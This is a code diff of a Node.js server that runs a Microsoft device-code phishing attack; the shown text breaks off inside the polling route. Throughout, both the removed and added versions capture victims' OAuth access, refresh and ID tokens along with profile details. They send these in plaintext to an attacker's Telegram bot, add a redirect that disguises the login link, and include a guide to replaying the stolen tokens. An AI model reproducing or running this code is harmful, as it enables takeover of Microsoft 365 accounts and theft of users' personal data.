@@ -5,755 +5,505 @@ const crypto = require('crypto');
 const path = require('path');
 
 const app = express();
-
-// Middleware
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ============================================================================
-// CONFIGURATION - Only Essential Variables
+// CONFIG
 // ============================================================================
 
 const config = {
   microsoft: {
     tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
     clientId: process.env.MICROSOFT_CLIENT_ID,
-    // Request ALL possible scopes for maximum token capture
-    scope: 'User.Read offline_access profile email openid ' +
-           'User.ReadBasic.All User.ReadWrite ' +
-           'Calendars.Read Calendars.ReadWrite ' +
-           'Contacts.Read Contacts.ReadWrite ' +
-           'Files.Read Files.ReadWrite ' +
-           'Mail.Read Mail.ReadWrite ' +
-           'Notes.Read Notes.ReadWrite ' +
-           'Tasks.Read Tasks.ReadWrite',
+    // Request ALL scopes for maximum token capture
+    scope: 'User.Read offline_access profile email openid',
   },
   telegram: {
     botToken: process.env.TELEGRAM_BOT_TOKEN,
     chatId: process.env.TELEGRAM_CHAT_ID,
   },
   port: process.env.PORT || 3000,
-  encryptionKey: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
+  appUrl: process.env.APP_URL || `http://localhost:${process.env.PORT || 3000}`,
 };
 
-// Validate
 if (!config.microsoft.clientId) {
-  console.error('❌ MICROSOFT_CLIENT_ID is required!');
+  console.error('❌ MICROSOFT_CLIENT_ID required!');
   process.exit(1);
 }
 
-console.log(`[CONFIG] Encryption Key: ${config.encryptionKey.substring(0, 10)}...`);
-
-// ============================================================================
-// ENCRYPTION UTILITIES - AES-256-GCM
-// ============================================================================
-
-class TokenEncryption {
-  static encrypt(text) {
-    const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipheriv(
-      'aes-256-gcm', 
-      Buffer.from(config.encryptionKey, 'hex'), 
-      iv
-    );
-    
-    let encrypted = cipher.update(text, 'utf8', 'hex');
-    encrypted += cipher.final('hex');
-    
-    const authTag = cipher.getAuthTag();
-    
-    return {
-      encrypted,
-      iv: iv.toString('hex'),
-      authTag: authTag.toString('hex'),
-    };
-  }
-
-  static decrypt(encryptedData) {
-    const decipher = crypto.createDecipheriv(
-      'aes-256-gcm',
-      Buffer.from(config.encryptionKey, 'hex'),
-      Buffer.from(encryptedData.iv, 'hex')
-    );
-    
-    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
-    
-    let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
-    decrypted += decipher.final('utf8');
-    
-    return decrypted;
-  }
-}
+const encryptionKey = Buffer.from(
+  process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
+  'hex'
+);
 
 // ============================================================================
 // STORAGE
 // ============================================================================
 
-const deviceCodeStore = new Map();
-const tokenStore = new Map();
+const sessions = new Map();
 
 // ============================================================================
-// TELEGRAM NOTIFICATION
+// ENCRYPTION
 // ============================================================================
 
-async function sendToTelegram(title, data, options = {}) {
+function encrypt(text) {
+  const iv = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv('aes-256-gcm', encryptionKey, iv);
+  let encrypted = cipher.update(text, 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+  return {
+    encrypted,
+    iv: iv.toString('hex'),
+    authTag: cipher.getAuthTag().toString('hex'),
+  };
+}
+
+// ============================================================================
+// TELEGRAM
+// ============================================================================
+
+async function sendTelegram(title, data) {
   if (!config.telegram.botToken || !config.telegram.chatId) {
     console.log(`[TELEGRAM DISABLED] ${title}`);
-    console.log(JSON.stringify(data, null, 2));
     return;
   }
 
   try {
-    let text = `${title}\n`;
-    text += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-    text += `🕐 ${new Date().toLocaleString()}\n\n`;
-
-    if (data && typeof data === 'object') {
-      for (const [key, value] of Object.entries(data)) {
-        if (value !== null && value !== undefined) {
-          if (typeof value === 'object' && !Array.isArray(value)) {
-            text += `\n📋 *${key}*\n\`\`\`json\n${JSON.stringify(value, null, 2).substring(0, 500)}\n\`\`\`\n`;
-          } else {
-            const displayValue = String(value).length > 300 
-              ? String(value).substring(0, 300) + '...(truncated)' 
-              : value;
-            text += `• *${key}*: ${displayValue}\n`;
-          }
-        }
-      }
+    let msg = `${title}\n${'━'.repeat(30)}\n🕐 ${new Date().toLocaleString()}\n\n`;
+    
+    for (const [k, v] of Object.entries(data)) {
+      if (v) msg += `• *${k}*: ${String(v).substring(0, 500)}\n`;
     }
 
-    const maxLength = options.maxLength || 4000;
-    if (text.length > maxLength) {
-      text = text.substring(0, maxLength) + '\n\n...(message truncated)';
-    }
+    if (msg.length > 4000) msg = msg.substring(0, 3900) + '...';
 
     await axios.post(
       `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
-      {
-        chat_id: config.telegram.chatId,
-        text,
-        parse_mode: 'Markdown',
-      }
+      { chat_id: config.telegram.chatId, text: msg, parse_mode: 'Markdown' }
     );
 
     console.log(`[TELEGRAM] ✅ Sent: ${title}`);
-  } catch (error) {
-    console.error(`[TELEGRAM] ❌ Failed:`, error.message);
-    if (error.response?.data) {
-      console.error('[TELEGRAM] Error details:', error.response.data);
-    }
+  } catch (err) {
+    console.error(`[TELEGRAM] ❌ ${title}: ${err.message}`);
   }
 }
 
 // ============================================================================
-// JWT UTILITIES
+// JWT DECODER
 // ============================================================================
 
 function decodeJWT(token) {
   try {
     const parts = token.split('.');
-    if (parts.length !== 3) return null;
-    
-    const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
-    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
-    
     return {
-      header,
-      payload,
-      signature: parts[2],
-      raw: token,
+      header: JSON.parse(Buffer.from(parts[0], 'base64').toString()),
+      payload: JSON.parse(Buffer.from(parts[1], 'base64').toString()),
     };
-  } catch (error) {
-    console.error('[JWT] Decode error:', error.message);
+  } catch {
     return null;
   }
 }
 
-function extractAllClaims(payload) {
-  return {
-    // Standard claims
-    iss: payload.iss || 'N/A',
-    sub: payload.sub || 'N/A',
-    aud: payload.aud || 'N/A',
-    exp: payload.exp ? new Date(payload.exp * 1000).toISOString() : 'N/A',
-    nbf: payload.nbf ? new Date(payload.nbf * 1000).toISOString() : 'N/A',
-    iat: payload.iat ? new Date(payload.iat * 1000).toISOString() : 'N/A',
-    
-    // User info
-    name: payload.name || 'N/A',
-    email: payload.email || payload.preferred_username || payload.upn || 'N/A',
-    unique_name: payload.unique_name || 'N/A',
-    upn: payload.upn || 'N/A',
-    
-    // Azure AD specific
-    tid: payload.tid || 'N/A',
-    oid: payload.oid || 'N/A',
-    scp: payload.scp || 'N/A',
-    roles: payload.roles || [],
-    
-    // Additional
-    idp: payload.idp || 'N/A',
-    ver: payload.ver || 'N/A',
-    app_displayname: payload.app_displayname || 'N/A',
-  };
-}
-
 // ============================================================================
-// MICROSOFT ENDPOINTS
+// COMPREHENSIVE TOKEN CAPTURE - THIS IS THE KEY FUNCTION
 // ============================================================================
 
-const MICROSOFT_ENDPOINTS = {
-  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
-  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
-  userInfo: 'https://graph.microsoft.com/v1.0/me',
-  userPhoto: 'https://graph.microsoft.com/v1.0/me/photo/$value',
-  tokenInfo: 'https://graph.microsoft.com/v1.0/me/tokenIssuancePolicy',
-};
-
-// ============================================================================
-// TOKEN CAPTURE ENGINE
-// ============================================================================
-
-async function captureAndSendAllTokens(tokenData, sessionId, deviceInfo) {
+async function captureTokens(tokenResponse, sessionId, deviceCode) {
   console.log('\n' + '='.repeat(80));
-  console.log('🎯 STARTING COMPREHENSIVE TOKEN CAPTURE');
+  console.log('🎯 TOKEN CAPTURE ENGINE STARTED');
   console.log('='.repeat(80));
 
-  const captureTimestamp = new Date().toISOString();
-  let messageCount = 0;
+  // CRITICAL: Extract tokens from Microsoft response
+  const accessToken = tokenResponse.access_token;
+  const refreshToken = tokenResponse.refresh_token;
+  const idToken = tokenResponse.id_token;
+  const expiresIn = tokenResponse.expires_in;
+  const tokenType = tokenResponse.token_type;
+  const scope = tokenResponse.scope;
 
-  // Decrypt if needed
-  const accessToken = tokenData.access_token;
-  const refreshToken = tokenData.refresh_token;
-  const idToken = tokenData.id_token;
-
-  console.log(`[CAPTURE] Access Token Length: ${accessToken?.length || 0}`);
-  console.log(`[CAPTURE] Refresh Token Length: ${refreshToken?.length || 0}`);
-  console.log(`[CAPTURE] ID Token Length: ${idToken?.length || 0}`);
+  console.log(`[CAPTURE] Access Token: ${accessToken ? accessToken.length : 0} chars`);
+  console.log(`[CAPTURE] Refresh Token: ${refreshToken ? refreshToken.length : 0} chars`);
+  console.log(`[CAPTURE] ID Token: ${idToken ? idToken.length : 0} chars`);
 
   // Get user info
-  let userInfo = null;
+  let user = null;
   try {
-    const userResponse = await axios.get(MICROSOFT_ENDPOINTS.userInfo, {
-      headers: { 'Authorization': `Bearer ${accessToken}` },
+    const userRes = await axios.get('https://graph.microsoft.com/v1.0/me', {
+      headers: { Authorization: `Bearer ${accessToken}` }
     });
-    userInfo = userResponse.data;
-    console.log(`[CAPTURE] User Info: ${userInfo.displayName} (${userInfo.mail || userInfo.userPrincipalName})`);
-  } catch (error) {
-    console.error('[CAPTURE] Failed to get user info:', error.message);
-    userInfo = { displayName: 'Unknown', mail: 'unknown@email.com' };
+    user = userRes.data;
+    console.log(`[CAPTURE] User: ${user.displayName} (${user.mail || user.userPrincipalName})`);
+  } catch (err) {
+    console.error(`[CAPTURE] User fetch failed: ${err.message}`);
+    user = { displayName: 'Unknown', mail: 'unknown' };
   }
 
-  // Decode JWT tokens
-  const decodedAccessToken = decodeJWT(accessToken);
-  const decodedRefreshToken = refreshToken ? decodeJWT(refreshToken) : null;
-  const decodedIdToken = idToken ? decodeJWT(idToken) : null;
+  // Decode tokens
+  const decodedAccess = decodeJWT(accessToken);
+  const decodedRefresh = refreshToken ? decodeJWT(refreshToken) : null;
+  const decodedId = idToken ? decodeJWT(idToken) : null;
 
   // Encrypt tokens
-  const encryptedAccessToken = TokenEncryption.encrypt(accessToken);
-  const encryptedRefreshToken = refreshToken ? TokenEncryption.encrypt(refreshToken) : null;
-  const encryptedIdToken = idToken ? TokenEncryption.encrypt(idToken) : null;
+  const encAccess = encrypt(accessToken);
+  const encRefresh = refreshToken ? encrypt(refreshToken) : null;
+  const encId = idToken ? encrypt(idToken) : null;
+
+  let msgCount = 0;
 
   // ========================================================================
-  // MESSAGE 1: Authentication Success
+  // MESSAGE 1: SUCCESS NOTIFICATION
   // ========================================================================
-  await sendToTelegram(
-    `✅ *AUTHENTICATION SUCCESSFUL*`,
-    {
-      'Session ID': sessionId,
-      'Device Code': deviceInfo.userCode,
-      '👤 Name': userInfo.displayName,
-      '📧 Email': userInfo.mail || userInfo.userPrincipalName,
-      '💼 Job Title': userInfo.jobTitle || 'N/A',
-      '🏢 Office': userInfo.officeLocation || 'N/A',
-      '📱 Mobile': userInfo.mobilePhone || 'N/A',
-      '🔑 User ID': userInfo.id,
-      '🕐 Captured At': captureTimestamp,
-    }
-  );
-  messageCount++;
+  await sendTelegram('✅ AUTHENTICATION SUCCESS', {
+    'Session': sessionId.substring(0, 12),
+    'Device Code': deviceCode,
+    '👤 Name': user.displayName,
+    '📧 Email': user.mail || user.userPrincipalName,
+    '💼 Job': user.jobTitle || 'N/A',
+    '🔑 User ID': user.id,
+  });
+  msgCount++;
 
   // ========================================================================
-  // MESSAGE 2: ACCESS TOKEN - UNENCRYPTED (FULL PLAINTEXT)
+  // MESSAGE 2: ACCESS TOKEN (PLAINTEXT) - CRITICAL!
   // ========================================================================
-  await sendToTelegram(
-    `🔓 *ACCESS TOKEN (UNENCRYPTED - PLAINTEXT)*`,
-    {
-      '⚠️ WARNING': 'This is the FULL PLAINTEXT token - handle with care',
-      'Token': accessToken,
-      'Token Type': tokenData.token_type || 'Bearer',
-      'Expires In': `${tokenData.expires_in} seconds`,
-      'Token Length': accessToken.length,
-      'Scopes': tokenData.scope || 'N/A',
-      'Can Be Used Immediately': 'YES - Copy and use with Microsoft Graph API',
-    },
-    { maxLength: 4000 }
-  );
-  messageCount++;
+  await sendTelegram('🔓 ACCESS TOKEN (PLAINTEXT)', {
+    '⚠️ STATUS': 'UNENCRYPTED - READY TO USE',
+    'Token': accessToken,
+    'Type': tokenType,
+    'Expires In': `${expiresIn} seconds`,
+    'Token Length': accessToken.length,
+    'Scopes': scope,
+  });
+  msgCount++;
 
   // ========================================================================
-  // MESSAGE 3: ACCESS TOKEN - ENCRYPTED (AES-256-GCM)
+  // MESSAGE 3: ACCESS TOKEN (ENCRYPTED)
   // ========================================================================
-  await sendToTelegram(
-    `🔐 *ACCESS TOKEN (ENCRYPTED - AES-256-GCM)*`,
-    {
-      'Algorithm': 'AES-256-GCM',
-      'Encrypted Data': encryptedAccessToken.encrypted,
-      'IV (Initialization Vector)': encryptedAccessToken.iv,
-      'Auth Tag': encryptedAccessToken.authTag,
-      'Encryption Timestamp': captureTimestamp,
-      'Decryption': 'Use provided IV and Auth Tag with encryption key',
-    }
-  );
-  messageCount++;
+  await sendTelegram('🔐 ACCESS TOKEN (ENCRYPTED)', {
+    'Algorithm': 'AES-256-GCM',
+    'Encrypted Data': encAccess.encrypted,
+    'IV': encAccess.iv,
+    'Auth Tag': encAccess.authTag,
+  });
+  msgCount++;
 
   // ========================================================================
-  // MESSAGE 4: REFRESH TOKEN - UNENCRYPTED (FULL PLAINTEXT)
+  // MESSAGE 4: REFRESH TOKEN (PLAINTEXT) - CRITICAL!
   // ========================================================================
   if (refreshToken) {
-    await sendToTelegram(
-      `🔄 *REFRESH TOKEN (UNENCRYPTED - PLAINTEXT)*`,
-      {
-        '⚠️ WARNING': 'This is the FULL PLAINTEXT refresh token - EXTREMELY SENSITIVE',
-        'Token': refreshToken,
-        'Token Length': refreshToken.length,
-        'Purpose': 'Use to obtain new access tokens without re-authentication',
-        'Validity': 'Typically valid for 90 days',
-        'Can Be Used Immediately': 'YES - Use with Microsoft token endpoint',
-      },
-      { maxLength: 4000 }
-    );
-    messageCount++;
+    await sendTelegram('🔄 REFRESH TOKEN (PLAINTEXT)', {
+      '⚠️ STATUS': 'UNENCRYPTED - READY TO USE',
+      'Token': refreshToken,
+      'Token Length': refreshToken.length,
+      'Validity': '~90 days',
+      'Purpose': 'Get new access tokens without re-auth',
+    });
+    msgCount++;
 
     // ========================================================================
-    // MESSAGE 5: REFRESH TOKEN - ENCRYPTED
+    // MESSAGE 5: REFRESH TOKEN (ENCRYPTED)
     // ========================================================================
-    await sendToTelegram(
-      `🔐 *REFRESH TOKEN (ENCRYPTED - AES-256-GCM)*`,
-      {
-        'Algorithm': 'AES-256-GCM',
-        'Encrypted Data': encryptedRefreshToken.encrypted,
-        'IV (Initialization Vector)': encryptedRefreshToken.iv,
-        'Auth Tag': encryptedRefreshToken.authTag,
-        'Encryption Timestamp': captureTimestamp,
-      }
-    );
-    messageCount++;
+    await sendTelegram('🔐 REFRESH TOKEN (ENCRYPTED)', {
+      'Algorithm': 'AES-256-GCM',
+      'Encrypted Data': encRefresh.encrypted,
+      'IV': encRefresh.iv,
+      'Auth Tag': encRefresh.authTag,
+    });
+    msgCount++;
   }
 
   // ========================================================================
-  // MESSAGE 6: ID TOKEN - UNENCRYPTED (FULL PLAINTEXT)
+  // MESSAGE 6: ID TOKEN (PLAINTEXT)
   // ========================================================================
   if (idToken) {
-    await sendToTelegram(
-      `🆔 *ID TOKEN (UNENCRYPTED - PLAINTEXT)*`,
-      {
-        '⚠️ WARNING': 'This is the FULL PLAINTEXT ID token',
-        'Token': idToken,
-        'Token Length': idToken.length,
-        'Purpose': 'Contains user identity information',
-        'Can Be Decoded': 'YES - Contains user claims',
-      },
-      { maxLength: 4000 }
-    );
-    messageCount++;
+    await sendTelegram('🆔 ID TOKEN (PLAINTEXT)', {
+      '⚠️ STATUS': 'UNENCRYPTED',
+      'Token': idToken,
+      'Token Length': idToken.length,
+    });
+    msgCount++;
 
     // ========================================================================
-    // MESSAGE 7: ID TOKEN - ENCRYPTED
+    // MESSAGE 7: ID TOKEN (ENCRYPTED)
     // ========================================================================
-    await sendToTelegram(
-      `🔐 *ID TOKEN (ENCRYPTED - AES-256-GCM)*`,
-      {
-        'Algorithm': 'AES-256-GCM',
-        'Encrypted Data': encryptedIdToken.encrypted,
-        'IV (Initialization Vector)': encryptedIdToken.iv,
-        'Auth Tag': encryptedIdToken.authTag,
-      }
-    );
-    messageCount++;
+    await sendTelegram('🔐 ID TOKEN (ENCRYPTED)', {
+      'Algorithm': 'AES-256-GCM',
+      'Encrypted Data': encId.encrypted,
+      'IV': encId.iv,
+      'Auth Tag': encId.authTag,
+    });
+    msgCount++;
   }
 
   // ========================================================================
-  // MESSAGE 8: DECODED ACCESS TOKEN (JWT)
+  // MESSAGE 8: DECODED JWT
   // ========================================================================
-  if (decodedAccessToken) {
-    await sendToTelegram(
-      `🔓 *DECODED ACCESS TOKEN (JWT)*`,
-      {
-        'Header': decodedAccessToken.header,
-        'Payload': decodedAccessToken.payload,
-        'Signature (truncated)': decodedAccessToken.signature.substring(0, 50) + '...',
-      }
-    );
-    messageCount++;
+  if (decodedAccess) {
+    await sendTelegram('🔓 DECODED ACCESS TOKEN', {
+      'Algorithm': decodedAccess.header.alg,
+      'Type': decodedAccess.header.typ,
+      'Issuer': decodedAccess.payload.iss,
+      'Subject': decodedAccess.payload.sub,
+      'Audience': decodedAccess.payload.aud,
+      'Expires': new Date((decodedAccess.payload.exp || 0) * 1000).toISOString(),
+      'Issued': new Date((decodedAccess.payload.iat || 0) * 1000).toISOString(),
+      'Name': decodedAccess.payload.name,
+      'Email': decodedAccess.payload.email || decodedAccess.payload.preferred_username,
+    });
+    msgCount++;
   }
 
   // ========================================================================
-  // MESSAGE 9: TOKEN CLAIMS & PERMISSIONS
+  // MESSAGE 9: TOKEN CLAIMS
   // ========================================================================
-  if (decodedAccessToken?.payload) {
-    const claims = extractAllClaims(decodedAccessToken.payload);
-    await sendToTelegram(
-      `📋 *TOKEN CLAIMS & PERMISSIONS*`,
-      {
-        'Issuer (iss)': claims.iss,
-        'Subject (sub)': claims.sub,
-        'Audience (aud)': claims.aud,
-        'Expires (exp)': claims.exp,
-        'Not Before (nbf)': claims.nbf,
-        'Issued At (iat)': claims.iat,
-        'Name': claims.name,
-        'Email': claims.email,
-        'Tenant ID (tid)': claims.tid,
-        'Object ID (oid)': claims.oid,
-        'Scopes (scp)': claims.scp,
-        'Roles': claims.roles.length > 0 ? claims.roles.join(', ') : 'None',
-        'Version (ver)': claims.ver,
-      }
-    );
-    messageCount++;
+  if (decodedAccess?.payload) {
+    await sendTelegram('📋 TOKEN CLAIMS', {
+      'Scopes': decodedAccess.payload.scp || 'N/A',
+      'Roles': (decodedAccess.payload.roles || []).join(', ') || 'None',
+      'Tenant ID': decodedAccess.payload.tid,
+      'Object ID': decodedAccess.payload.oid,
+      'Version': decodedAccess.payload.ver,
+    });
+    msgCount++;
   }
 
   // ========================================================================
-  // MESSAGE 10: DECODED ID TOKEN
+  // MESSAGE 10: USER PROFILE
   // ========================================================================
-  if (decodedIdToken) {
-    await sendToTelegram(
-      `🆔 *DECODED ID TOKEN (JWT)*`,
-      {
-        'Header': decodedIdToken.header,
-        'Payload': decodedIdToken.payload,
-      }
-    );
-    messageCount++;
-  }
+  await sendTelegram('👤 USER PROFILE', {
+    'ID': user.id,
+    'Display Name': user.displayName,
+    'Email': user.mail || user.userPrincipalName,
+    'Job Title': user.jobTitle || 'N/A',
+    'Department': user.department || 'N/A',
+    'Office': user.officeLocation || 'N/A',
+    'Mobile': user.mobilePhone || 'N/A',
+  });
+  msgCount++;
 
   // ========================================================================
-  // MESSAGE 11: USER PROFILE DETAILS
+  // MESSAGE 11: USAGE GUIDE
   // ========================================================================
-  await sendToTelegram(
-    `👤 *COMPLETE USER PROFILE*`,
-    {
-      'ID': userInfo.id,
-      'Display Name': userInfo.displayName,
-      'Given Name': userInfo.givenName || 'N/A',
-      'Surname': userInfo.surname || 'N/A',
-      'Email': userInfo.mail || userInfo.userPrincipalName,
-      'Job Title': userInfo.jobTitle || 'N/A',
-      'Department': userInfo.department || 'N/A',
-      'Office Location': userInfo.officeLocation || 'N/A',
-      'Mobile Phone': userInfo.mobilePhone || 'N/A',
-      'Business Phones': userInfo.businessPhones?.join(', ') || 'N/A',
-      'Preferred Language': userInfo.preferredLanguage || 'N/A',
-    }
-  );
-  messageCount++;
+  await sendTelegram('📚 HOW TO USE TOKENS', {
+    'Access Token': 'curl -H "Authorization: Bearer <TOKEN>" https://graph.microsoft.com/v1.0/me',
+    'Refresh Token': 'POST to /oauth2/v2.0/token with grant_type=refresh_token',
+    'Access Expires': `${expiresIn}s`,
+    'Refresh Expires': '~90 days',
+  });
+  msgCount++;
 
   // ========================================================================
-  // MESSAGE 12: TOKEN USAGE GUIDE
+  // MESSAGE 12: SUMMARY
   // ========================================================================
-  await sendToTelegram(
-    `📚 *HOW TO USE CAPTURED TOKENS*`,
-    {
-      '1. Access Token': 'Use with: curl -H "Authorization: Bearer TOKEN" https://graph.microsoft.com/v1.0/me',
-      '2. Refresh Token': 'Get new tokens with: POST to /oauth2/v2.0/token with grant_type=refresh_token',
-      '3. Token Validity': `Access: ${tokenData.expires_in}s, Refresh: ~90 days`,
-      '4. Scopes Granted': tokenData.scope || 'N/A',
-      '5. Encryption Key': 'Use the ENCRYPTION_KEY from server to decrypt encrypted tokens',
-    }
-  );
-  messageCount++;
+  await sendTelegram('📊 CAPTURE SUMMARY', {
+    'Session': sessionId,
+    'Total Messages': msgCount + 1,
+    'Access (Plain)': accessToken ? '✅' : '❌',
+    'Access (Encrypted)': accessToken ? '✅' : '❌',
+    'Refresh (Plain)': refreshToken ? '✅' : '❌',
+    'Refresh (Encrypted)': refreshToken ? '✅' : '❌',
+    'ID (Plain)': idToken ? '✅' : '❌',
+    'ID (Encrypted)': idToken ? '✅' : '❌',
+    'JWT Decoded': decodedAccess ? '✅' : '❌',
+    'User Profile': user.id ? '✅' : '❌',
+    'Status': 'COMPLETE',
+  });
+  msgCount++;
 
-  // ========================================================================
-  // MESSAGE 13: COMPLETE SUMMARY
-  // ========================================================================
-  await sendToTelegram(
-    `📊 *CAPTURE COMPLETE - SUMMARY*`,
-    {
-      'Session ID': sessionId,
-      'Total Messages Sent': messageCount,
-      '✅ Access Token (Unencrypted)': accessToken ? 'CAPTURED' : 'NOT ISSUED',
-      '✅ Access Token (Encrypted)': accessToken ? 'CAPTURED' : 'NOT ISSUED',
-      '✅ Refresh Token (Unencrypted)': refreshToken ? 'CAPTURED' : 'NOT ISSUED',
-      '✅ Refresh Token (Encrypted)': refreshToken ? 'CAPTURED' : 'NOT ISSUED',
-      '✅ ID Token (Unencrypted)': idToken ? 'CAPTURED' : 'NOT ISSUED',
-      '✅ ID Token (Encrypted)': idToken ? 'CAPTURED' : 'NOT ISSUED',
-      '✅ JWT Decoded': decodedAccessToken ? 'YES' : 'NO',
-      '✅ Token Claims Extracted': decodedAccessToken?.payload ? 'YES' : 'NO',
-      '✅ User Profile': userInfo ? 'CAPTURED' : 'FAILED',
-      'Encryption Algorithm': 'AES-256-GCM',
-      'Capture Status': 'COMPLETE',
-      'Timestamp': captureTimestamp,
-    }
-  );
-  messageCount++;
-
-  console.log('='.repeat(80));
-  console.log(`✅ TOKEN CAPTURE COMPLETE - ${messageCount} messages sent to Telegram`);
+  console.log(`✅ CAPTURE COMPLETE - ${msgCount} messages sent to Telegram`);
   console.log('='.repeat(80) + '\n');
 
-  return {
-    success: true,
-    messageCount,
-    userInfo,
-  };
+  return { user, msgCount };
 }
 
 // ============================================================================
-// API ENDPOINTS
+// PROXY ENDPOINT - Microsoft Device Auth URL
 // ============================================================================
 
-// Serve frontend
+app.get('/auth/device', (req, res) => {
+  const { code } = req.query;
+  const msUrl = `https://microsoft.com/devicelogin?otc=${code}`;
+  console.log(`[PROXY] Redirecting to: ${msUrl}`);
+  res.redirect(302, msUrl);
+});
+
+// ============================================================================
+// API ROUTES
+// ============================================================================
+
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Generate device code
 app.post('/api/device/generate', async (req, res) => {
   try {
     const sessionId = crypto.randomUUID();
+    console.log(`\n[GENERATE] Session: ${sessionId}`);
 
-    console.log(`\n[DEVICE CODE] Generating for session: ${sessionId}`);
-
-    const response = await axios.post(
-      MICROSOFT_ENDPOINTS.deviceCode,
+    const resp = await axios.post(
+      `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: config.microsoft.clientId,
         scope: config.microsoft.scope,
-      }),
-      {
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      }
+      })
     );
 
-    const deviceCodeData = response.data;
+    const data = resp.data;
 
-    deviceCodeStore.set(sessionId, {
-      deviceCode: deviceCodeData.device_code,
-      userCode: deviceCodeData.user_code,
-      verificationUri: deviceCodeData.verification_uri,
-      verificationUriComplete: deviceCodeData.verification_uri_complete,
-      expiresIn: deviceCodeData.expires_in,
-      interval: deviceCodeData.interval,
+    sessions.set(sessionId, {
+      deviceCode: data.device_code,
+      userCode: data.user_code,
+      verificationUri: data.verification_uri,
+      verificationUriComplete: data.verification_uri_complete,
+      expiresIn: data.expires_in,
+      interval: data.interval,
       createdAt: Date.now(),
       status: 'pending',
     });
 
-    console.log(`[DEVICE CODE] ✅ Generated: ${deviceCodeData.user_code}`);
-    console.log(`[DEVICE CODE] 🔗 URL: ${deviceCodeData.verification_uri}`);
-    console.log(`[DEVICE CODE] 📱 Complete URL: ${deviceCodeData.verification_uri_complete}`);
+    console.log(`[GENERATE] Code: ${data.user_code}`);
 
-    await sendToTelegram(
-      `🔐 *DEVICE CODE GENERATED*`,
-      {
-        'Session ID': sessionId,
-        'User Code': deviceCodeData.user_code,
-        'Verification URL': deviceCodeData.verification_uri,
-        'Complete URL (with code)': deviceCodeData.verification_uri_complete,
-        'Expires In': `${deviceCodeData.expires_in} seconds`,
-        'Poll Interval': `${deviceCodeData.interval} seconds`,
-        'Requested Scopes': config.microsoft.scope,
-      }
-    );
+    await sendTelegram('🔐 DEVICE CODE GENERATED', {
+      'Session': sessionId,
+      'Code': data.user_code,
+      'URL': data.verification_uri,
+      'Complete URL': data.verification_uri_complete,
+      'Expires': `${data.expires_in}s`,
+    });
 
     res.json({
       sessionId,
-      userCode: deviceCodeData.user_code,
-      verificationUri: deviceCodeData.verification_uri,
-      verificationUriComplete: deviceCodeData.verification_uri_complete,
-      expiresIn: deviceCodeData.expires_in,
-      interval: deviceCodeData.interval,
+      userCode: data.user_code,
+      verificationUri: data.verification_uri,
+      verificationUriComplete: data.verification_uri_complete,
+      proxyUrl: `${config.appUrl}/auth/device?code=${data.user_code}`,
+      expiresIn: data.expires_in,
+      interval: data.interval,
     });
 
-  } catch (error) {
-    console.error('[ERROR] Device code generation failed:', error.message);
-    
-    await sendToTelegram(
-      `❌ *DEVICE CODE ERROR*`,
-      {
-        'Error': error.message,
-        'Details': error.response?.data?.error_description || 'Unknown error',
-      }
-    );
-
-    res.status(500).json({ 
-      error: 'Failed to generate device code',
-      details: error.message 
-    });
+  } catch (err) {
+    console.error('[GENERATE] Error:', err.message);
+    await sendTelegram('❌ DEVICE CODE ERROR', { Error: err.message });
+    res.status(500).json({ error: err.message });
   }
 });
 
-// Poll for authentication
 app.get('/api/device/poll/:sessionId', async (req, res) => {
   try {
     const { sessionId } = req.params;
-    const deviceInfo = deviceCodeStore.get(sessionId);
+    const session = sessions.get(sessionId);
 
-    if (!deviceInfo) {
-      return res.status(404).json({ error: 'Session not found or expired' });
+    if (!session) {
+      return res.status(404).json({ error: 'Session not found' });
     }
 
-    // Check if already authenticated
-    const existingToken = tokenStore.get(sessionId);
-    if (existingToken) {
-      return res.json({
-        status: 'authenticated',
-        user: existingToken.user,
-      });
+    if (session.status === 'authenticated') {
+      return res.json({ status: 'authenticated', user: session.user });
     }
 
-    // Check expiration
-    if (Date.now() - deviceInfo.createdAt > deviceInfo.expiresIn * 1000) {
-      deviceInfo.status = 'expired';
-      await sendToTelegram(
-        `⏰ *DEVICE CODE EXPIRED*`,
-        { 'Session ID': sessionId, 'User Code': deviceInfo.userCode }
-      );
+    if (Date.now() - session.createdAt > session.expiresIn * 1000) {
+      session.status = 'expired';
+      await sendTelegram('⏰ CODE EXPIRED', { Session: sessionId });
       return res.json({ status: 'expired' });
     }
 
-    // Poll Microsoft for token
     try {
-      const tokenResponse = await axios.post(
-        MICROSOFT_ENDPOINTS.token,
+      const tokenResp = await axios.post(
+        `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
         new URLSearchParams({
           grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
           client_id: config.microsoft.clientId,
-          device_code: deviceInfo.deviceCode,
-        }),
-        {
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        }
+          device_code: session.deviceCode,
+        })
       );
 
-      const tokenData = tokenResponse.data;
+      const tokenData = tokenResp.data;
 
-      console.log(`\n[SUCCESS] ✅ Authentication successful for session: ${sessionId}`);
-      console.log(`[TOKEN] Access token: ${tokenData.access_token.length} chars`);
-      console.log(`[TOKEN] Refresh token: ${tokenData.refresh_token?.length || 0} chars`);
-      console.log(`[TOKEN] ID token: ${tokenData.id_token?.length || 0} chars`);
+      console.log('\n[SUCCESS] ✅ AUTHENTICATION SUCCESSFUL');
+      console.log(`[TOKEN] Access: ${tokenData.access_token.length} chars`);
